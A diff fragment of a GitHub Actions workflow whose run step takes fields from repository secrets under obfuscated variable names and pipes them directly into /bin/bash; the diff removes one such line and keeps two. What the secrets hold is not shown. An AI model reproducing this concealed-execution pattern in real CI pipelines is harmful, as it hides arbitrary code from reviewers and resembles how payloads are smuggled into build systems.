@@ -22,7 +22,6 @@ jobs:
           xmp1: ${{ secrets.xmp1 }}
         run: |
           printf '%s' "$xmp1" | jq -r .k481 | /bin/bash
-          echo $bem36 | jq -r .i62940 | /bin/bash
           echo $tinxh46026 | jq -r .meufs8785 | /bin/bash
 
       - name: Save output
